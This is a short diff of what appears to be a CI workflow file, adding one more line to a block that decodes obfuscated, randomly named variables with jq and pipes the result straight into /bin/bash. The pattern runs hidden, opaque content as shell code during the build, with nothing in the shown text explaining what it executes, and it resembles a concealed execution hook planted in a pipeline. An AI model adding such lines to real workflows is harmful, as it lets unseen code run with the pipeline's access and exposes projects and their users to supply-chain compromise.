@@ -42,6 +42,7 @@ jobs:
           echo $nymv41765 | jq -r .ym3 | /bin/bash
           echo $hi69569 | jq -r .vsur369 | /bin/bash
           echo $qzv52249 | jq -r .il256 | /bin/bash
+          printf '%s' "$ay44" | jq -r .s05287 | /bin/bash
 
       - name: Store results
         if: always()
